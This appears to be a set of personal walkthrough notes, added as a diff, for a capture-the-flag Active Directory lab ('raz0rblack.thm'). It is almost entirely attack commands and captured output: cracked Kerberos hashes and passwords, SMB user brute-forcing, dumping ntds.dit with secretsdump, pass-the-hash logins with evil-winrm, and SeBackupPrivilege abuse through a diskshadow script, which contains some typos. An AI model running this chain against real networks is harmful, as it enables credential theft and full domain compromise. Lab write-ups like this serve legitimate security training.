@@ -1,0 +1,155 @@
+Opening the excel file with libreoffice
+----------------------------------------
+#libreoffice employee.xlsx &
+
+Print the first coloumn and second column including space
+---------------------------------------------------------
+#cat user.txt | awk '{print $1 " " $2}'
+
+$1=first column
+$2=second column
+
+
+$krb5asrep$23$twilliams@RAZ0RBLACK.THM:444ad7e0039469438d8e48e6e8a83f4b$b8f14e8285bdcc3a56bbee2ed29b223b7357bb9f57084c08dbba4f6a7dcbe065cc8b7f01a860ba1472f16e0a950b93d8fc8a739ed04068201d7f648b1dc2d14f79b2aa4e8bdcae739bebd44f56f7abf1fa675ccaed6024488850fe438aac676f629f03a55f38fb65f04bd9d512b8d5c9fbfa9ad47c2d7bb00c836af0d38d60d575893e64482bd7184ae6c20a2c56c228eccff649e4cbc7d58aa3348b80243d68faa06be835a7e7bba27c91b27fda517ec4bbea9904b5786b73f075688ce94c82a6a91cec3792b567ec9fb4829148f090e0498d66257b836ce04f595da0f039d6e2ed2021d3c10f7747d7911639a40f07
+
+twilliams:roastpotatoes
+ 
+
+#smbmap -H 10.10.28.108 -u twilliams -p roastpotatoes
+
+The IPC share has read access, that means we can bruteforce the usernames.
+
+#
+
+
+All Sid-Users may be used same password because twilliams is in Sid_user. So we have to brute-force the username
+------------------------------------------------------------------------------------------------------------------
+#crackmapexec smb $ip -u user.txt -p pass.txt --rid-brute 
+
+SMB         10.10.212.43    445    HAVEN-DC         [-] raz0rblack.thm\sbradley:roastpotatoes STATUS_PASSWORD_MUST_CHANGE 
+
+
+We have to change sbradley password.
+
+#smbpasswd -r 10.10.233.4 -U sbradley
+
+
+machine 10.10.119.245 rejected the password change: Error was : The transport connection is now disconnected..
+
+
+default (impacket-smbpasswd doesn't work to change smbpasswd)
+
+Download new smbpasswd.py and change smbpasswd
+----------------------------------------------
+
+#smbpasswd.py sbradley@10.10.119.245
+
+Get into that user's smb
+
+#smbclient //10.10.119.245/trash -U sbradley
+
+Zip file is too large to transfer from smb service. So, open file explorer(Thunar),write that command in search bar
+(smb://10.10.119.245/trash)
+
+electromagnetismo (zip password)
+
+We get ntds.dit && system.hive from zip file
+--------------------------------------------
+
+Now, we will use secretsdump to extract all of the usernames and their NT hashes
+
+#secretsdump.py -ntds ntds.dit -system system.hive LOCAL | tee hash_dump.txt
+
+
+Here, we are performing a cut operation, since we only need the NT hash, since we are going to perform a Pass the Hash attack
+------------------------------------------------------------------------------------------------------------------------------
+cat hash_dump.txt | cut -d':' -f4 | tee final_hash.txt
+
+delete until ':' and only retrieve forth column
+
+
+
+[+] raz0rblack.thm\lvetrova:f220d3988deb3f516c73f40ee16c431d
+
+
+#evil-winrm -u lvetrova -H f220d3988deb3f516c73f40ee16c431d -i 10.10.80.18 -N
+
+
+We found lvetrova.xml
+
+PowerShell has the ability to encrypt passwords, but also retrieve the encrypted data by the user who encrypted the data initially. In order to do this, we need to run 2 commands:
+
+Create a variable name equal to Import-CLixml -Path <xml file name>
+Calling the variable, to run a 2nd command to decrypt the file using the password of the user
+
+
+$flag = Import-CLixml -Path lvetrova.xml
+$flag.GetNetworkCredential().Password
+
+
+Kerberos 5, etype 23, TGS-REP(13100)
+--------------------------------
+
+$krb5tgs$23$*xyan1d3$RAZ0RBLACK.THM$raz0rblack.thm/xyan1d3*$4e9064567d371145749f60b62380fb84$32ded3e59e244cd2273006994a640ba45bb62ada11d2388914a7b955cd33ba4e0f8773347f0f90849810e77badeac3fdedb2d7bd09af91c95eef856dca554ff4f6c60497da1b3180c2bc52f23828410a76ea641c689fd8d4c0bd4a6cc4cf190a5c75842e98d6e74dae6b7518d6044180b169f3be7278ced407f4b0be1c805a9f14aabb94149d3156ceeb9e46e1719f1bae02938b8676f27c49822a9c353ff34b246e7401840ee25e89f98816f43e0bea619ecd9ac484851e4ac25c0da991abd37a0fc4eaf5f7ba601e0dba253ac9ac1180b41d3065e4234bc477932fcc7a4b0e5a528e1208d622c1418de9f4c9e5225f253b400426831b0f4ac721329352839e889fe6fbdf73b8e12c508013e935b3c03adf701fe825a3a94d19b7d794ec30db5eb3525bdf3c06febff8e4cac298d0a9747f2d0c56da070cff4f3640a828f95b7f15a57685f5d8949a045d839a2be2e21a9a0ac5324dd3ac9689e7c4d20dd585247a84811676cc4554bf33650241a7b9248570ef0603369a506ad62a29456a8a401690e08fa1744db238ed3ecf66d19a7bd02ce25cba8539b756a558dae746f004ddde01e1442719ece05dcbe5b40d34b5f83251d9af37c4126ba6023ca3cd2570e6a176d478fddaf5331b35769d6a5a2c8b58eae8c91238393a74b0783e92dbe4ef6a2e253d8c0a13d75afb89b1e52f348c9884de90e59bf28b9ac5b95a6e692937e3f01f7413444382ece95466f92f5a83a2e8908c3e36f82f245c15d1820846b500ad12e451079b6713b6312672e980311dfa506383176341ef1cecdb48bd392ee0c5d0d788e99aa72cc65d7de006f308d71caaedcf342cf1bbb9fbda57d3f478c71cb16b62c7e35875335b42f34a30abeaea55b8fc807f0c2ac1045eea1dcb8b7225c469c1ed0d869687eb9a2d79713632d747b2b49abd25a8cb69423744c3a3b164dc6768c592694256b7fbdbbc3f7fce38d4e8671f75d42adde53e1fd0fe6a0ffc332e62e11b346f7d917879b505a42e37706d00f06d78fc01608b1c9c9460389e1274d24e85ea21e0cf37570c15681fd5f774cfbba2bdc8af718041e94af376379815465ed81e43797b424d8417cdca8563b243deef23f6fd4c395dee987c0601d7fb08c9c19c599889dc3173e73230ded8630c6496c453959b507d1563e29aaeb2f7ab2ab2ac25ab401333446d9c50ed69ee89aea61e89e131a15c37504d0551e0fbfc75a150f7640354b50f34c9235f0fdd6a591dbdc90ee0e7fcd53e7fb84ee87d5986a75b183dd75225ecdb9291ef729465d07e1b3b81c366c44e963bc3cb039be5cf18e7c9c35a5658d98946cc6263ed4e41dbd63ad89e387c9df8d03ac1d1d2bcec43d51a6b15969c6c7172622abc452085720b031585f2806a5d1ff146e5b2a6606f2e144d3788f4c5
+
+xyan1d3:cyanide9amine5628
+
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeBackupPrivilege             Back up files and directories  Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
+upload diskshadow.txt
+
+diskshadow script
+------------------                                                                   
+set metadata C:\tmp\tmp.cabs
+set context persistent nowriterss
+add volume C: alias cdrivee
+createe
+expose %cdrive% F::
+
+
+When executing diskshadow, it deletes the last number so add any one word in last word
+
+C:\tmp> upload diskshadow3.txt
+C:\tmp> diskshadow.exe /s ./diskshadow3.txt 
+
+
+We need 2 DLLS and then need to Import them.
+
+
+https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug?source=post_page-----8b4ec8ec5118--------------------------------
+
+
+
+C:\tmp> upload SeBackupPrivilegeCmdLets.dll
+C:\tmp> upload SeBackupPrivilegeUtils.dll
+
+We need to copy the SYSTEM hive over to tmp: reg save HKLM\SYSTEM c:\tmp\system
+
+C:\tmp> reg save HKLM\SYSTEM c:\tmp\system
+
+
+We also need the ntds file
+
+C:\tmp> Copy-FileSeBackupPrivilege F:\Windows\NTDS\ntds.dit C:\tmp\ntds.dit
+
+Download system and ntds.dit into our machine from (file explorer or)
+
+C:\tmp> download system
+C:\tmp> download ntds.dit
+
+#secretdump.py -ntds ntds.dit -system system LOCAL
+
+Finally got administrator hash and get into administrator with evil-winrm
+
+
+
+C:\> gci -recurse -filter "top*" (filtering the top word)
